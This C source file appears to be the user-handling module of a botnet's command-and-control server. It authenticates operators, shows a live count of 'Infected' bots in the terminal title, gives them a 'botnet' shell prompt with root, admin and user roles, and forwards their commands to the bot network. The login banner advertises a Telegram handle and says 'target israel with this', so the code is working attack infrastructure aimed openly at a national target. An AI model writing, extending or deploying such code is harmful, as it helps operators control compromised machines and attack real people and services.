#include "headers/user_handler.h"
#include "headers/botnet.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <errno.h>
#include <signal.h>
#include <poll.h>

int user_sockets[MAX_USERS] = {0};
pthread_mutex_t user_sockets_mutex = PTHREAD_MUTEX_INITIALIZER;

void setup_signal_handlers() {
    signal(SIGPIPE, SIG_IGN);
}

void* update_title(void* arg) {
    int client_socket = *((int*)arg);
    free(arg);
    static char buffer[128];
    static int written;
    while (1) {
        int valid_bots = 0;
        int users_online = 0;
        pthread_mutex_lock(&bot_mutex);
        for (int i = 0; i < bot_count; i++) {
            if (!bots[i].is_valid) continue;
            int is_duplicate = 0;
            for (int j = 0; j < i; j++) {
                if (bots[j].is_valid && bots[j].address.sin_addr.s_addr == bots[i].address.sin_addr.s_addr) {
                    is_duplicate = 1;
                    break;
                }
            }
            if (!is_duplicate) valid_bots++;
        }
        pthread_mutex_unlock(&bot_mutex);
        pthread_mutex_lock(&user_sockets_mutex);
        for (int i = 0; i < MAX_USERS; i++) {
            if (user_sockets[i] > 0) {
                users_online++;
            }
        }
        pthread_mutex_unlock(&user_sockets_mutex);
        written = snprintf(buffer, sizeof(buffer), "\0337\033]0;Infected: %d | Users Online: %d\007\0338", valid_bots, users_online);
        if (written > 0 && written < (int)sizeof(buffer) && client_socket > 0) {
            if (send(client_socket, buffer, (size_t)written, MSG_NOSIGNAL) < 0) break;
        }
        sleep(2);
    }
    return NULL;
}

void cleanup_user_session(int user_index) {
    pthread_mutex_lock(&user_sockets_mutex);
    if (user_index >= 0 && user_index < MAX_USERS) {
        if (user_sockets[user_index] > 0) {
            shutdown(user_sockets[user_index], SHUT_RDWR);
            close(user_sockets[user_index]);
            user_sockets[user_index] = 0;
        }
        if (user_index < user_count) {
            users[user_index].is_logged_in = 0;
        }
    }
    pthread_mutex_unlock(&user_sockets_mutex);
}

static void refresh_socket_state(int user_index) {
    pthread_mutex_lock(&user_sockets_mutex);
    if (user_index >= 0 && user_index < MAX_USERS) {
        if (user_sockets[user_index] > 0) {
            char tmp[256];
            while (recv(user_sockets[user_index], tmp, sizeof(tmp), MSG_DONTWAIT) > 0) {}
            int optval = 1;
            setsockopt(user_sockets[user_index], SOL_SOCKET, SO_KEEPALIVE, &optval, sizeof(optval));
        }
    }
    pthread_mutex_unlock(&user_sockets_mutex);
}

void* handle_client(void* arg) {
    setup_signal_handlers();
    int client_socket = *((int*)arg);
    free(arg);
    int optval = 1;
    setsockopt(client_socket, SOL_SOCKET, SO_KEEPALIVE, &optval, sizeof(optval));
    struct sockaddr_in addr;
    socklen_t addr_len = sizeof(addr);
    if (getpeername(client_socket, (struct sockaddr*)&addr, &addr_len) != 0) {
        close(client_socket);
        return NULL;
    }
    char user_ip[INET_ADDRSTRLEN] = {0};
    if (!inet_ntop(AF_INET, &addr.sin_addr, user_ip, sizeof(user_ip))) {
        close(client_socket);
        return NULL;
    }
    static char buffer[256];
    static int written;
    char username[64] = {0}, password[64] = {0};
    written = snprintf(buffer, sizeof(buffer), "\r" RED "Username: " GRAY);
    if (written <= 0 || written >= (int)sizeof(buffer)) {
        close(client_socket);
        return NULL;
    }
    if (send(client_socket, buffer, (size_t)written, MSG_NOSIGNAL) < 0) {
        close(client_socket);
        return NULL;
    }
    ssize_t len = 0;
    int uidx = 0;
    while (1) {
        len = recv(client_socket, username + uidx, sizeof(username) - 1 - uidx, 0);
        if (len <= 0) {
            close(client_socket);
            return NULL;
        }
        int found = 0;
        for (int i = uidx; i < uidx + len; i++) {
            if (username[i] == '\n' || username[i] == '\r') {
                username[i] = 0;
                found = 1;
                break;
            }
        }
        uidx += len;
        if (found) break;
        if (uidx >= (int)sizeof(username) - 1) {
            close(client_socket);
            return NULL;
        }
    }
    for (int i = 0; username[i]; i++) {
        if (username[i] < 32 || username[i] > 126) {
            username[i] = 0;
            break;
        }
    }
    written = snprintf(buffer, sizeof(buffer), "\r" RED "Password: " GRAY);
    if (written <= 0 || written >= (int)sizeof(buffer)) {
        close(client_socket);
        return NULL;
    }
    if (send(client_socket, buffer, (size_t)written, MSG_NOSIGNAL) < 0) {
        close(client_socket);
        return NULL;
    }
    int pidx = 0;
    while (1) {
        len = recv(client_socket, password + pidx, sizeof(password) - 1 - pidx, 0);
        if (len <= 0) {
            close(client_socket);
            return NULL;
        }
        int found = 0;
        for (int i = pidx; i < pidx + len; i++) {
            if (password[i] == '\n' || password[i] == '\r') {
                password[i] = 0;
                found = 1;
                break;
            }
        }
        pidx += len;
        if (found) break;
        if (pidx >= (int)sizeof(password) - 1) {
            close(client_socket);
            return NULL;
        }
    }
    for (int i = 0; password[i]; i++) {
        if (password[i] < 32 || password[i] > 126) {
            password[i] = 0;
            break;
        }
    }
    int user_index = check_login(username, password);
    if (user_index == -1) {
        load_users();
        user_index = check_login(username, password);
        if (user_index == -1) {
            snprintf(buffer, sizeof(buffer), "\r" RED "Invalid login" RESET "\r\n");
            send(client_socket, buffer, strlen(buffer), MSG_NOSIGNAL);
            close(client_socket);
            return NULL;
        }
    }
    while (user_index == -2) {
        int found = 0;
        for (int i = 0; i < user_count; i++) {
            if (strcmp(username, users[i].user) == 0 && strcmp(password, users[i].pass) == 0) {
                if (user_sockets[i] != 0) {
                    char tmp;
                    ssize_t alive = recv(user_sockets[i], &tmp, 1, MSG_PEEK | MSG_DONTWAIT);
                    if (alive == 0 || (alive < 0 && errno != EAGAIN && errno != EWOULDBLOCK)) {
                        cleanup_user_session(i);
                    } else {
                        found = 1;
                    }
                } else {
                    users[i].is_logged_in = 0;
                }
            }
        }
        if (!found) {
            user_index = check_login(username, password);
            if (user_index != -2) break;
        }
        snprintf(buffer, sizeof(buffer), "\r" YELLOW "User connected already, Disconnect? Y/N: " RESET);
        if (send(client_socket, buffer, strlen(buffer), MSG_NOSIGNAL) < 0) {
            close(client_socket);
            return NULL;
        }
        char response[8] = {0};
        len = recv(client_socket, response, sizeof(response) - 1, 0);
        if (len <= 0) {
            close(client_socket);
            return NULL;
        }
        response[len] = 0;
        response[strcspn(response, "\r\n")] = 0;
        if (strcasecmp(response, "Y") == 0) {
            for (int i = 0; i < user_count; i++) {
                if (strcmp(username, users[i].user) == 0 && strcmp(password, users[i].pass) == 0) {
                    cleanup_user_session(i);
                }
            }
            user_index = check_login(username, password);
        } else {
            close(client_socket);
            return NULL;
        }
    }
    if (user_index >= 0) {
        User *user = &users[user_index];
        if (user_sockets[user_index] > 0) {
            cleanup_user_session(user_index);
        }
        user_sockets[user_index] = client_socket;
        user->is_logged_in = 1;
        refresh_socket_state(user_index);
        snprintf(buffer, sizeof(buffer),
            RESET "\r=== Logged in successfully ===\n"
            RED "\rver: 1.0 - t.me/flylegit | target israel with this\n"
            RESET);
        if (send(client_socket, buffer, strlen(buffer), MSG_NOSIGNAL) < 0) {
            close(client_socket);
            user->is_logged_in = 0;
            user_sockets[user_index] = 0;
            return NULL;
        }
        pthread_t update_thread;
        int *update_arg = malloc(sizeof(int));
        if (!update_arg) {
            close(client_socket);
            user->is_logged_in = 0;
            user_sockets[user_index] = 0;
            return NULL;
        }
        *update_arg = client_socket;
        pthread_create(&update_thread, NULL, update_title, update_arg);
        pthread_detach(update_thread);
        char command[MAX_COMMAND_LENGTH];
        char prompt[256];
        while (1) {
            struct pollfd pfd = {0};
            pfd.fd = client_socket;
            pfd.events = POLLIN | POLLHUP | POLLERR;
            int pollres = poll(&pfd, 1, 0);
            if (pollres > 0 && (pfd.revents & (POLLHUP | POLLERR))) {
                close(client_socket);
                user->is_logged_in = 0;
                user_sockets[user_index] = 0;
                break;
            }
            sync_user_root_status(user);
            if (user->prefix_enabled) {
                const char *role = "user";
                const char *role_color = GRAY;
                if (user->is_root) {
                    role = "root";
                    role_color = GREEN;
                } else if (user->is_admin) {
                    role = "admin";
                    role_color = CYAN;
                }
                snprintf(prompt, sizeof(prompt),
                    "\r%s%s%s%s@%sbotnet%s(%s%s%s)%s~# %s",
                    GRAY, user->user, GRAY, RED,
                    GRAY, GRAY, role_color, role, GRAY, RED,
                    RESET);
            } else {
                snprintf(prompt, sizeof(prompt),
                    "\r%s%s%s%s@%sbotnet%s~# %s",
                    GRAY, user->user, GRAY, RED,
                    GRAY, RED,
                    RESET);
            }
                
            if (send(client_socket, prompt, strlen(prompt), MSG_NOSIGNAL) < 0) break;
            memset(command, 0, sizeof(command));
            ssize_t len = recv(client_socket, command, sizeof(command) - 1, 0);
            if (len <= 0) {
                close(client_socket);
                user->is_logged_in = 0;
                user_sockets[user_index] = 0;
                break;
            }
            command[len] = 0;
            int cmd_idx = 0;
            for (int i = 0; i < len; i++) {
                if (command[i] == '\r' || command[i] == '\n' || command[i] < 32) {
                    break;
                }
                if (command[i] >= 32 && command[i] <= 126) {
                    command[cmd_idx++] = command[i];
                }
            }
            command[cmd_idx] = 0;
            if (strlen(command) == 0) {
                continue;
            }
            process_command(user, command, client_socket, user_ip);
        }
    }
    return NULL;
}
